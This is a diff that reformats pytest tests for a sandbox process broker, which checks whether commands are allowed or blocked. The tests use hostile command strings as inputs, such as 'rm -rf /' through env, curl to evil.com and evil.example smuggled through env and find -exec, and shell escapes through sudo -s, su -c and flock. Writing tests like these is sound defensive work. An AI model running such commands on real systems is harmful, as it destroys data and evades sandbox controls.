@@ -10,37 +10,34 @@ Covers:
 
 from __future__ import annotations
 
-import time
 import threading
+
 import pytest
 
+from openspace.sandbox.leases import REQUIRED_BLOCKED_COMMANDS, ProcessCapability
 from openspace.sandbox.process_broker import (
-    ProcessBroker,
-    ProcessBrokerConfig,
-    ProcessRecord,
-    ProcessTracker,
+    _DANGEROUS_SYSCALLS,
+    _LINK_COMMANDS,
+    _SHELL_BINARIES,
     CommandBlockedError,
     CommandNotAllowedError,
-    ShellNotAllowedError,
-    ProcessLimitError,
-    SyscallBlockedError,
     ExecutionTimeoutError,
-    _extract_basename,
+    ProcessBroker,
+    ProcessBrokerConfig,
+    ProcessLimitError,
+    ProcessTracker,
+    ShellNotAllowedError,
+    SyscallBlockedError,
     _extract_arg_tokens,
+    _extract_basename,
     _strip_exe,
-    check_command_blocked,
     check_command_allowed,
+    check_command_blocked,
+    check_link_command,
     check_shell_allowed,
     check_shell_command,
     check_syscall_allowed,
-    check_link_command,
-    _SHELL_BINARIES,
-    _SHELL_WRAPPERS,
-    _DANGEROUS_SYSCALLS,
-    _LINK_COMMANDS,
 )
-from openspace.sandbox.leases import ProcessCapability, REQUIRED_BLOCKED_COMMANDS
-
 
 # ═══════════════════════════════════════════════════════════════════════
 # #99 — Command Allow/Deny
@@ -1047,27 +1044,39 @@ class TestR4NonWrapperArgSafe:
     """
 
     def test_git_checkout_rm_allowed(self) -> None:
-        broker = ProcessBroker(ProcessBrokerConfig(
-            allowed_commands=("git",),
-            blocked_commands=("rm",),
-            max_processes=10, max_execution_time_s=300, allow_shell=False,
-        ))
+        broker = ProcessBroker(
+            ProcessBrokerConfig(
+                allowed_commands=("git",),
+                blocked_commands=("rm",),
+                max_processes=10,
+                max_execution_time_s=300,
+                allow_shell=False,
+            )
+        )
         broker.check_command("git", ["checkout", "rm"])
 
     def test_cat_file_named_reboot(self) -> None:
-        broker = ProcessBroker(ProcessBrokerConfig(
-            allowed_commands=("cat",),
-            blocked_commands=("reboot",),
-            max_processes=10, max_execution_time_s=300, allow_shell=False,
-        ))
+        broker = ProcessBroker(
+            ProcessBrokerConfig(
+                allowed_commands=("cat",),
+                blocked_commands=("reboot",),
+                max_processes=10,
+                max_execution_time_s=300,
+                allow_shell=False,
+            )
+        )
         broker.check_command("cat", ["/tmp/reboot"])
 
     def test_grep_pattern_shutdown(self) -> None:
-        broker = ProcessBroker(ProcessBrokerConfig(
-            allowed_commands=("grep",),
-            blocked_commands=("shutdown",),
-            max_processes=10, max_execution_time_s=300, allow_shell=False,
-        ))
+        broker = ProcessBroker(
+            ProcessBrokerConfig(
+                allowed_commands=("grep",),
+                blocked_commands=("shutdown",),
+                max_processes=10,
+                max_execution_time_s=300,
+                allow_shell=False,
+            )
+        )
         broker.check_command("grep", ["shutdown", "log.txt"])
 
 
@@ -1075,20 +1084,28 @@ class TestR4WrapperArgScanStillWorks:
     """Wrappers must still scan args for blocked commands."""
 
     def test_env_rm_still_blocked(self) -> None:
-        broker = ProcessBroker(ProcessBrokerConfig(
-            allowed_commands=(),
-            blocked_commands=("rm",),
-            max_processes=10, max_execution_time_s=300, allow_shell=True,
-        ))
+        broker = ProcessBroker(
+            ProcessBrokerConfig(
+                allowed_commands=(),
+                blocked_commands=("rm",),
+                max_processes=10,
+                max_execution_time_s=300,
+                allow_shell=True,
+            )
+        )
         with pytest.raises(CommandBlockedError):
             broker.check_command("env", ["rm", "-rf", "/"])
 
     def test_sudo_reboot_still_blocked(self) -> None:
-        broker = ProcessBroker(ProcessBrokerConfig(
-            allowed_commands=(),
-            blocked_commands=("reboot",),
-            max_processes=10, max_execution_time_s=300, allow_shell=True,
-        ))
+        broker = ProcessBroker(
+            ProcessBrokerConfig(
+                allowed_commands=(),
+                blocked_commands=("reboot",),
+                max_processes=10,
+                max_execution_time_s=300,
+                allow_shell=True,
+            )
+        )
         with pytest.raises(CommandBlockedError):
             broker.check_command("sudo", ["reboot"])
 
@@ -1097,36 +1114,54 @@ class TestR4FindParallelWrapper:
     """find and parallel are wrappers — their -exec args get scanned."""
 
     def test_find_exec_sh_blocked(self) -> None:
-        broker = ProcessBroker(ProcessBrokerConfig(
-            allowed_commands=(), blocked_commands=(),
-            max_processes=10, max_execution_time_s=300, allow_shell=False,
-        ))
+        broker = ProcessBroker(
+            ProcessBrokerConfig(
+                allowed_commands=(),
+                blocked_commands=(),
+                max_processes=10,
+                max_execution_time_s=300,
+                allow_shell=False,
+            )
+        )
         with pytest.raises(ShellNotAllowedError):
             broker.check_command("find", [".", "-exec", "sh", "-c", "id", ";"])
 
     def test_find_exec_rm_blocked(self) -> None:
-        broker = ProcessBroker(ProcessBrokerConfig(
-            allowed_commands=(),
-            blocked_commands=("rm",),
-            max_processes=10, max_execution_time_s=300, allow_shell=True,
-        ))
+        broker = ProcessBroker(
+            ProcessBrokerConfig(
+                allowed_commands=(),
+                blocked_commands=("rm",),
+                max_processes=10,
+                max_execution_time_s=300,
+                allow_shell=True,
+            )
+        )
         with pytest.raises(CommandBlockedError):
             broker.check_command("find", [".", "-exec", "rm", "-rf", "{}", ";"])
 
     def test_parallel_sh_blocked(self) -> None:
-        broker = ProcessBroker(ProcessBrokerConfig(
-            allowed_commands=(), blocked_commands=(),
-            max_processes=10, max_execution_time_s=300, allow_shell=False,
-        ))
+        broker = ProcessBroker(
+            ProcessBrokerConfig(
+                allowed_commands=(),
+                blocked_commands=(),
+                max_processes=10,
+                max_execution_time_s=300,
+                allow_shell=False,
+            )
+        )
         with pytest.raises(ShellNotAllowedError):
             broker.check_command("parallel", ["sh", "-c", "echo {}"])
 
     def test_find_exec_allowed_cmd_passes(self) -> None:
-        broker = ProcessBroker(ProcessBrokerConfig(
-            allowed_commands=("find", "echo"),
-            blocked_commands=(),
-            max_processes=10, max_execution_time_s=300, allow_shell=False,
-        ))
+        broker = ProcessBroker(
+            ProcessBrokerConfig(
+                allowed_commands=("find", "echo"),
+                blocked_commands=(),
+                max_processes=10,
+                max_execution_time_s=300,
+                allow_shell=False,
+            )
+        )
         broker.check_command("find", [".", "-exec", "echo", "{}", ";"])
 
 
@@ -1134,30 +1169,42 @@ class TestR4AllowlistFlagEmbedded:
     """Flag-embedded commands must be checked against the allowlist."""
 
     def test_env_split_string_curl_blocked(self) -> None:
-        broker = ProcessBroker(ProcessBrokerConfig(
-            allowed_commands=("env", "python"),
-            blocked_commands=(),
-            max_processes=10, max_execution_time_s=300, allow_shell=True,
-        ))
+        broker = ProcessBroker(
+            ProcessBrokerConfig(
+                allowed_commands=("env", "python"),
+                blocked_commands=(),
+                max_processes=10,
+                max_execution_time_s=300,
+                allow_shell=True,
+            )
+        )
         with pytest.raises(CommandNotAllowedError):
             broker.check_command("env", ["--split-string=curl https://evil.com"])
 
     def test_env_short_flag_curl_blocked(self) -> None:
         """env -Scurl must also be caught by allowlist."""
-        broker = ProcessBroker(ProcessBrokerConfig(
-            allowed_commands=("env", "python"),
-            blocked_commands=(),
-            max_processes=10, max_execution_time_s=300, allow_shell=True,
-        ))
+        broker = ProcessBroker(
+            ProcessBrokerConfig(
+                allowed_commands=("env", "python"),
+                blocked_commands=(),
+                max_processes=10,
+                max_execution_time_s=300,
+                allow_shell=True,
+            )
+        )
         with pytest.raises(CommandNotAllowedError):
             broker.check_command("env", ["-Scurl"])
 
     def test_env_split_string_allowed_passes(self) -> None:
-        broker = ProcessBroker(ProcessBrokerConfig(
-            allowed_commands=("env", "python"),
-            blocked_commands=(),
-            max_processes=10, max_execution_time_s=300, allow_shell=True,
-        ))
+        broker = ProcessBroker(
+            ProcessBrokerConfig(
+                allowed_commands=("env", "python"),
+                blocked_commands=(),
+                max_processes=10,
+                max_execution_time_s=300,
+                allow_shell=True,
+            )
+        )
         broker.check_command("env", ["--split-string=python script.py"])
 
 
@@ -1193,20 +1240,29 @@ class TestR5FlockWrapper:
     """flock must be treated as a wrapper."""
 
     def test_flock_bash_blocked(self) -> None:
-        broker = ProcessBroker(ProcessBrokerConfig(
-            allowed_commands=(), blocked_commands=(),
-            max_processes=10, max_execution_time_s=300, allow_shell=False,
-        ))
+        broker = ProcessBroker(
+            ProcessBrokerConfig(
+                allowed_commands=(),
+                blocked_commands=(),
+                max_processes=10,
+                max_execution_time_s=300,
+                allow_shell=False,
+            )
+        )
         with pytest.raises(ShellNotAllowedError):
             broker.check_command("flock", ["/tmp/lock", "bash", "-c", "id"])
 
     def test_flock_allowed_cmd_passes(self) -> None:
         """flock's first positional arg is a lock file — second is the command."""
-        broker = ProcessBroker(ProcessBrokerConfig(
-            allowed_commands=("flock", "echo", "lock"),
-            blocked_commands=(),
-            max_processes=10, max_execution_time_s=300, allow_shell=False,
-        ))
+        broker = ProcessBroker(
+            ProcessBrokerConfig(
+                allowed_commands=("flock", "echo", "lock"),
+                blocked_commands=(),
+                max_processes=10,
+                max_execution_time_s=300,
+                allow_shell=False,
+            )
+        )
         broker.check_command("flock", ["/tmp/lock", "echo", "hello"])
 
 
@@ -1215,112 +1271,205 @@ class TestR5MultiExecAllowlist:
 
     def test_second_exec_not_allowed(self) -> None:
         """Second -exec with non-allowed command is caught by pass C."""
-        broker = ProcessBroker(ProcessBrokerConfig(
-            allowed_commands=("find", "echo"),
-            blocked_commands=(),
-            max_processes=10, max_execution_time_s=300, allow_shell=False,
-        ))
+        broker = ProcessBroker(
+            ProcessBrokerConfig(
+                allowed_commands=("find", "echo"),
+                blocked_commands=(),
+                max_processes=10,
+                max_execution_time_s=300,
+                allow_shell=False,
+            )
+        )
         with pytest.raises(CommandNotAllowedError):
-            broker.check_command("find", [
-                ".", "-exec", "echo", "{}", ";",
-                "-exec", "curl", "https://evil.example", ";",
-            ])
+            broker.check_command(
+                "find",
+                [
+                    ".",
+                    "-exec",
+                    "echo",
+                    "{}",
+                    ";",
+                    "-exec",
+                    "curl",
+                    "https://evil.example",
+                    ";",
+                ],
+            )
 
     def test_second_exec_blocked_cmd_caught(self) -> None:
         """Blocked-command check also scans ALL wrapper args."""
-        broker = ProcessBroker(ProcessBrokerConfig(
-            allowed_commands=("find", "echo"),
-            blocked_commands=("curl",),
-            max_processes=10, max_execution_time_s=300, allow_shell=False,
-        ))
+        broker = ProcessBroker(
+            ProcessBrokerConfig(
+                allowed_commands=("find", "echo"),
+                blocked_commands=("curl",),
+                max_processes=10,
+                max_execution_time_s=300,
+                allow_shell=False,
+            )
+        )
         with pytest.raises(CommandBlockedError):
-            broker.check_command("find", [
-                ".", "-exec", "echo", "{}", ";",
-                "-exec", "curl", "https://evil.example", ";",
-            ])
+            broker.check_command(
+                "find",
+                [
+                    ".",
+                    "-exec",
+                    "echo",
+                    "{}",
+                    ";",
+                    "-exec",
+                    "curl",
+                    "https://evil.example",
+                    ";",
+                ],
+            )
 
     def test_second_exec_shell_caught(self) -> None:
         """Shell check scans ALL wrapper args — second -exec sh blocked."""
-        broker = ProcessBroker(ProcessBrokerConfig(
-            allowed_commands=("find", "echo"),
-            blocked_commands=(),
-            max_processes=10, max_execution_time_s=300, allow_shell=False,
-        ))
+        broker = ProcessBroker(
+            ProcessBrokerConfig(
+                allowed_commands=("find", "echo"),
+                blocked_commands=(),
+                max_processes=10,
+                max_execution_time_s=300,
+                allow_shell=False,
+            )
+        )
         with pytest.raises(ShellNotAllowedError):
-            broker.check_command("find", [
-                ".", "-exec", "echo", "{}", ";",
-                "-exec", "sh", "-c", "id", ";",
-            ])
+            broker.check_command(
+                "find",
+                [
+                    ".",
+                    "-exec",
+                    "echo",
+                    "{}",
+                    ";",
+                    "-exec",
+                    "sh",
+                    "-c",
+                    "id",
+                    ";",
+                ],
+            )
 
     def test_all_exec_allowed_passes(self) -> None:
-        broker = ProcessBroker(ProcessBrokerConfig(
-            allowed_commands=("find", "echo", "grep"),
-            blocked_commands=(),
-            max_processes=10, max_execution_time_s=300, allow_shell=False,
-        ))
-        broker.check_command("find", [
-            ".", "-exec", "echo", "{}", ";",
-            "-exec", "grep", "pattern", "{}", ";",
-        ])
+        broker = ProcessBroker(
+            ProcessBrokerConfig(
+                allowed_commands=("find", "echo", "grep"),
+                blocked_commands=(),
+                max_processes=10,
+                max_execution_time_s=300,
+                allow_shell=False,
+            )
+        )
+        broker.check_command(
+            "find",
+            [
+                ".",
+                "-exec",
+                "echo",
+                "{}",
+                ";",
+                "-exec",
+                "grep",
+                "pattern",
+                "{}",
+                ";",
+            ],
+        )
 
 
 class TestR5ShellInvokingFlags:
     """sudo -s, su -, doas -s must be blocked when allow_shell=False."""
 
     def test_sudo_dash_s(self) -> None:
-        broker = ProcessBroker(ProcessBrokerConfig(
-            allowed_commands=("sudo",), blocked_commands=(),
-            max_processes=10, max_execution_time_s=300, allow_shell=False,
-        ))
+        broker = ProcessBroker(
+            ProcessBrokerConfig(
+                allowed_commands=("sudo",),
+                blocked_commands=(),
+                max_processes=10,
+                max_execution_time_s=300,
+                allow_shell=False,
+            )
+        )
         with pytest.raises(ShellNotAllowedError):
             broker.check_command("sudo", ["-s"])
 
     def test_sudo_dash_i(self) -> None:
-        broker = ProcessBroker(ProcessBrokerConfig(
-            allowed_commands=("sudo",), blocked_commands=(),
-            max_processes=10, max_execution_time_s=300, allow_shell=False,
-        ))
+        broker = ProcessBroker(
+            ProcessBrokerConfig(
+                allowed_commands=("sudo",),
+                blocked_commands=(),
+                max_processes=10,
+                max_execution_time_s=300,
+                allow_shell=False,
+            )
+        )
         with pytest.raises(ShellNotAllowedError):
             broker.check_command("sudo", ["-i"])
 
     def test_su_dash(self) -> None:
-        broker = ProcessBroker(ProcessBrokerConfig(
-            allowed_commands=("su",), blocked_commands=(),
-            max_processes=10, max_execution_time_s=300, allow_shell=False,
-        ))
+        broker = ProcessBroker(
+            ProcessBrokerConfig(
+                allowed_commands=("su",),
+                blocked_commands=(),
+                max_processes=10,
+                max_execution_time_s=300,
+                allow_shell=False,
+            )
+        )
         with pytest.raises(ShellNotAllowedError):
             broker.check_command("su", ["-"])
 
     def test_doas_dash_s(self) -> None:
-        broker = ProcessBroker(ProcessBrokerConfig(
-            allowed_commands=("doas",), blocked_commands=(),
-            max_processes=10, max_execution_time_s=300, allow_shell=False,
-        ))
+        broker = ProcessBroker(
+            ProcessBrokerConfig(
+                allowed_commands=("doas",),
+                blocked_commands=(),
+                max_processes=10,
+                max_execution_time_s=300,
+                allow_shell=False,
+            )
+        )
         with pytest.raises(ShellNotAllowedError):
             broker.check_command("doas", ["-s"])
 
     def test_sudo_dash_s_allowed_when_shell_true(self) -> None:
-        broker = ProcessBroker(ProcessBrokerConfig(
-            allowed_commands=("sudo",), blocked_commands=(),
-            max_processes=10, max_execution_time_s=300, allow_shell=True,
-        ))
+        broker = ProcessBroker(
+            ProcessBrokerConfig(
+                allowed_commands=("sudo",),
+                blocked_commands=(),
+                max_processes=10,
+                max_execution_time_s=300,
+                allow_shell=True,
+            )
+        )
         broker.check_command("sudo", ["-s"])
 
     def test_sudo_combined_si_blocked(self) -> None:
         """Combined short flags: -si means -s + -i, both shell-invoking."""
-        broker = ProcessBroker(ProcessBrokerConfig(
-            allowed_commands=("sudo",), blocked_commands=(),
-            max_processes=10, max_execution_time_s=300, allow_shell=False,
-        ))
+        broker = ProcessBroker(
+            ProcessBrokerConfig(
+                allowed_commands=("sudo",),
+                blocked_commands=(),
+                max_processes=10,
+                max_execution_time_s=300,
+                allow_shell=False,
+            )
+        )
         with pytest.raises(ShellNotAllowedError):
             broker.check_command("sudo", ["-si"])
 
     def test_sudo_combined_uis_blocked(self) -> None:
         """Even with other flags mixed in, -s is detected."""
-        broker = ProcessBroker(ProcessBrokerConfig(
-            allowed_commands=("sudo",), blocked_commands=(),
-            max_processes=10, max_execution_time_s=300, allow_shell=False,
-        ))
+        broker = ProcessBroker(
+            ProcessBrokerConfig(
+                allowed_commands=("sudo",),
+                blocked_commands=(),
+                max_processes=10,
+                max_execution_time_s=300,
+                allow_shell=False,
+            )
+        )
         with pytest.raises(ShellNotAllowedError):
             broker.check_command("sudo", ["-uis"])
 
@@ -1329,11 +1478,15 @@ class TestR5GlobPatternSkip:
     """Glob patterns (find -name *.py) should not be checked as commands."""
 
     def test_find_name_glob_not_blocked(self) -> None:
-        broker = ProcessBroker(ProcessBrokerConfig(
-            allowed_commands=("find", "echo"),
-            blocked_commands=(),
-            max_processes=10, max_execution_time_s=300, allow_shell=False,
-        ))
+        broker = ProcessBroker(
+            ProcessBrokerConfig(
+                allowed_commands=("find", "echo"),
+                blocked_commands=(),
+                max_processes=10,
+                max_execution_time_s=300,
+                allow_shell=False,
+            )
+        )
         broker.check_command("find", [".", "-name", "*.py", "-exec", "echo", "{}", ";"])
 
 
@@ -1344,32 +1497,52 @@ class TestR7SuRunuserCommand:
     """su -c and runuser -c invoke a shell — must block when allow_shell=False."""
 
     def test_su_dash_c_blocked(self) -> None:
-        broker = ProcessBroker(ProcessBrokerConfig(
-            allowed_commands=("su",), blocked_commands=(),
-            max_processes=10, max_execution_time_s=300, allow_shell=False,
-        ))
+        broker = ProcessBroker(
+            ProcessBrokerConfig(
+                allowed_commands=("su",),
+                blocked_commands=(),
+                max_processes=10,
+                max_execution_time_s=300,
+                allow_shell=False,
+            )
+        )
         with pytest.raises(ShellNotAllowedError):
             broker.check_command("su", ["-c", "id"])
 
     def test_su_command_flag_blocked(self) -> None:
-        broker = ProcessBroker(ProcessBrokerConfig(
-            allowed_commands=("su",), blocked_commands=(),
-            max_processes=10, max_execution_time_s=300, allow_shell=False,
-        ))
+        broker = ProcessBroker(
+            ProcessBrokerConfig(
+                allowed_commands=("su",),
+                blocked_commands=(),
+                max_processes=10,
+                max_execution_time_s=300,
+                allow_shell=False,
+            )
+        )
         with pytest.raises(ShellNotAllowedError):
             broker.check_command("su", ["--command", "id"])
 
     def test_runuser_dash_c_blocked(self) -> None:
-        broker = ProcessBroker(ProcessBrokerConfig(
-            allowed_commands=("runuser",), blocked_commands=(),
-            max_processes=10, max_execution_time_s=300, allow_shell=False,
-        ))
+        broker = ProcessBroker(
+            ProcessBrokerConfig(
+                allowed_commands=("runuser",),
+                blocked_commands=(),
+                max_processes=10,
+                max_execution_time_s=300,
+                allow_shell=False,
+            )
+        )
         with pytest.raises(ShellNotAllowedError):
             broker.check_command("runuser", ["-c", "id"])
 
     def test_su_dash_c_allowed_when_shell_true(self) -> None:
-        broker = ProcessBroker(ProcessBrokerConfig(
-            allowed_commands=("su", "id"), blocked_commands=(),
-            max_processes=10, max_execution_time_s=300, allow_shell=True,
-        ))
+        broker = ProcessBroker(
+            ProcessBrokerConfig(
+                allowed_commands=("su", "id"),
+                blocked_commands=(),
+                max_processes=10,
+                max_execution_time_s=300,
+                allow_shell=True,
+            )
+        )
         broker.check_command("su", ["-c", "id"])
